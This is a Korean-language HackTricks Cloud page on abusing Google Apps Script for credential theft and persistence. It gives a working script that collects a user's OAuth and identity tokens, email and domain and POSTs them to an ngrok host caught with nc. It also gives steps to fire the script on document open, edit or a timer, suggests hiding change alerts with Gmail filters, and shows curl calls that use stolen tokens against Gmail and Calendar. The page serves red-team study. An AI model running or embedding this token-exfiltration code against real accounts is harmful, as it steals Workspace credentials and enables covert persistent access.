# GWS - App Scripts

{% hint style="success" %}
AWS 해킹 학습 및 실습:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP 해킹 학습 및 실습: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원</summary>

* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* 💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃헙 저장소에 PR을 제출하여 해킹 요령을 공유하세요.

</details>
{% endhint %}

## App Scripts

App Scripts는 **사용자가 편집 권한으로 문서에 액세스할 때 트리거되는 코드**이며 **OAuth 프롬프트를 수락한 후**에 실행됩니다.\
또한 App Script의 소유자가 설정하여 **일정 시간마다 실행**되도록 할 수도 있습니다 (지속성).

### App Script 생성

App Script를 생성하는 여러 가지 방법이 있지만, 가장 일반적인 방법은 **Google 문서(모든 유형)**나 **독립형 프로젝트**에서 생성하는 것입니다:

<details>

<summary>Google 문서, 시트 또는 슬라이드에서 컨테이너 바운드 프로젝트 생성</summary>

1. 문서, 시트 또는 슬라이드를 엽니다.
2. **확장 기능** > **Google Apps Script**를 클릭합니다.
3. 스크립트 편집기에서 **Untitled project**를 클릭합니다.
4. 프로젝트에 이름을 지정하고 **이름 바꾸기**를 클릭합니다.

</details>

<details>

<summary>독립형 프로젝트 생성</summary>

Apps Script에서 독립형 프로젝트를 생성하려면:

1. [`script.google.com`](https://script.google.com/)로 이동합니다.
2. **새 프로젝트 추가**를 클릭합니다.
3. 스크립트 편집기에서 **Untitled project**를 클릭합니다.
4. 프로젝트에 이름을 지정하고 **이름 바꾸기**를 클릭합니다.

</details>

<details>

<summary>Google 드라이브에서 독립형 프로젝트 생성</summary>

1. [Google 드라이브](https://drive.google.com/)를 엽니다.
2. **새로 만들기** > **기타** > **Google Apps Script**를 클릭합니다.

</details>

<details>

<summary>Google Forms에서 컨테이너 바운드 프로젝트 생성</summary>

1. Google Forms에서 양식을 엽니다.
2. 더보기 more\_vert > **스크립트 편집기**를 클릭합니다.
3. 스크립트 편집기에서 **Untitled project**를 클릭합니다.
4. 프로젝트에 이름을 지정하고 **이름 바꾸기**를 클릭합니다.

</details>

<details>

<summary>clasp 명령줄 도구를 사용하여 독립형 프로젝트 생성</summary>

`clasp`는 터미널에서 Apps Script 프로젝트를 생성, 가져오기/밀어넣기 및 배포할 수 있는 명령줄 도구입니다.

자세한 내용은 [Command Line Interface using `clasp` guide](https://developers.google.com/apps-script/guides/clasp)를 참조하세요.

</details>

## App Script 시나리오 <a href="#create-using-clasp" id="create-using-clasp"></a>

### App Script를 사용한 Google 시트 생성

App Script를 생성하기 위해 Google 시트를 만들고 **`확장 기능 > App Scripts`**로 이동하면 시트에 연결된 **새 App Script**가 열립니다.

### 토큰 노출

OAuth 토큰에 액세스 권한을 부여하려면 **`서비스 추가 +`를 클릭하여** 다음과 같은 스코프를 추가하세요:

* **AdminDirectory**: 디렉터리의 사용자 및 그룹에 액세스 (사용자에게 충분한 권한이 있는 경우)
* **Gmail**: Gmail 데이터에 액세스
* **Drive**: 드라이브 데이터에 액세스
* **Google Sheets API**: 트리거와 함께 작동하도록 하기 위해

**필요한 스코프를 직접 변경**하려면 프로젝트 설정으로 이동하여 **`편집기에서 "appsscript.json" 매니페스트 파일 표시`를 활성화**하세요.

{% code overflow="wrap" %}
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

요청을 캡처하려면 다음을 실행하면 됩니다:
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
### 앱 스크립트를 실행하기 위해 요청된 권한:

<figure><img src="../../../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
외부 요청이 발생하면 OAuth 프롬프트에서도 **외부 엔드포인트에 액세스할 수 있는 권한을 요청**합니다.
{% endhint %}

### 트리거 생성

앱을 읽은 후 **⏰ 트리거**를 클릭하여 트리거를 생성합니다. **`getToken`**을 선택하여 **함수**로 지정하고, 배포 시 **`Head`**를 선택하고, 이벤트 소스에서 **`스프레드시트에서`**를 선택하고, 이벤트 유형에서 **`열기`** 또는 **`편집`** (필요에 따라)를 선택하고 저장합니다.

또한 디버그를 위해 **앱 스크립트의 실행 탭에서 실행을 확인**할 수 있습니다.

### 공유

**앱 스크립트**를 **트리거**하려면 피해자가 **편집자 액세스**로 연결해야 합니다.

{% hint style="success" %}
**앱 스크립트를 실행하는 데 사용되는 토큰**은 **트리거 생성자의 토큰**이 될 것이며, 파일이 다른 사용자에 의해 편집자로 열렸더라도 마찬가지입니다.
{% endhint %}

### 공유된 문서 남용

{% hint style="danger" %}
누군가가 **앱 스크립트가 포함된 문서를 공유하고 트리거를 사용하여 앱 스크립트의 Head를 사용**했다면, 앱 스크립트 코드를 수정하고 (예: 토큰 도용 기능 추가), 액세스하고, **앱 스크립트가 문서를 공유한 사용자의 권한으로 실행**될 것입니다! (트리거 생성 시 제공된 액세스 범위가 소유자 OAuth 토큰에 있을 것임을 유의하십시오).

**스크립트를 수정한 사실을 알리는 알림이 스크립트 생성자에게 전송**됩니다 (알림을 방지하기 위해 gmail 권한을 사용하여 필터를 생성하는 것은 어떨까요?)
{% endhint %}

{% hint style="success" %}
**공격자가 앱 스크립트의 범위를 수정**하면 업데이트가 문서에 **적용되지 않을 것**입니다. 따라서, 공격자는 생성한 트리거에서 설정한 범위보다 더 많은 범위의 소유자 생성 토큰을 도용할 수 없을 것입니다.
{% endhint %}

### 공유 대신 복사

문서를 공유할 링크를 만들면 다음과 유사한 링크가 생성됩니다: `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
링크 끝에 있는 **"/edit"**를 **"/copy"**로 변경하면 구글이 문서의 사본을 생성할지 묻는 메시지가 표시됩니다:

<figure><img src="../../../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

사용자가 복사하고 액세스하면 **문서 내용과 앱 스크립트가 모두 복사**되지만 **트리거는 복사되지 않으므로 실행되지 않을 것**입니다.

### 웹 애플리케이션으로 공유

앱 스크립트를 웹 애플리케이션으로 **공유**하는 것도 가능합니다 (앱 스크립트 편집기에서 웹 애플리케이션으로 배포). 그러나 다음과 같은 경고가 표시됩니다:

<figure><img src="../../../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>

필요한 권한을 요청하는 **일반적인 OAuth 프롬프트가 뒤따릅니다**.

### 테스트

다음과 같이 이메일 목록을 나열하기 위해 수집된 토큰을 테스트할 수 있습니다:

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

사용자의 캘린더 목록:
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## 지속성으로서의 앱 스크립트

지속성을 위한 한 가지 옵션은 **문서를 생성하고 getToken 함수에 대한 트리거를 추가하고 문서를 공격자와 공유하여 공격자가 파일을 열 때마다 피해자의 토큰을 유출하도록 하는 것**입니다.

또한 앱 스크립트를 생성하고 X 시간마다(분, 시간, 일 등) 트리거되도록 만들 수도 있습니다. **자격 증명이나 피해자의 세션을 탈취한 공격자는 앱 스크립트 시간 트리거를 설정하고 매일 매우 권한이 있는 OAuth 토큰을 유출할 수 있습니다**:

앱 스크립트를 생성하고 트리거로 이동하여 트리거 추가를 클릭하고 이벤트 소스로 시간 기반을 선택하고 적합한 옵션을 선택하십시오:

<figure><img src="../../../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
이로 인해 보안 경보 이메일이 생성되고 이에 대한 모바일 푸시 메시지가 전송됩니다.
{% endhint %}

### 공유 문서 미검증 프롬프트 우회

또한 누군가가 **편집 액세스**로 문서를 **공유**했다면, 문서 내에서 **앱 스크립트를 생성**하고 문서의 **소유자(생성자)가 앱 스크립트의 소유자가 될 것**입니다.

{% hint style="warning" %}
이는 **문서의 생성자가 해당 문서 내에서 생성된 모든 앱 스크립트의 생성자로 나타날 것**을 의미합니다.

이는 또한 **앱 스크립트가 문서의 생성자의 Workspace 환경에서 신뢰**받을 것을 의미합니다.
{% endhint %}

{% hint style="danger" %}
이는 또한 **앱 스크립트가 이미 존재**하고 사람들이 **액세스 권한을 부여**했다면, 문서에 **편집자** 권한이 있는 사람은 **수정하고 해당 액세스를 남용**할 수 있습니다.\
이를 남용하려면 사람들이 앱 스크립트를 트리거하도록 해야 합니다. 그리고 한 가지 꿀팁은 **스크립트를 웹 앱으로 게시**하는 것입니다. 이미 **액세스를 부여한 사람들**이 웹 페이지에 액세스하면 **앱 스크립트가 트리거**됩니다(`<img>` 태그를 사용하여도 작동합니다).
{% endhint %}

{% hint style="success" %}
AWS 해킹 학습 및 실습:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP 해킹 학습 및 실습: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원</summary>

* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* 💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃헙 저장소에 PR을 제출하여 해킹 요령을 공유하세요.

</details>
{% endhint %}
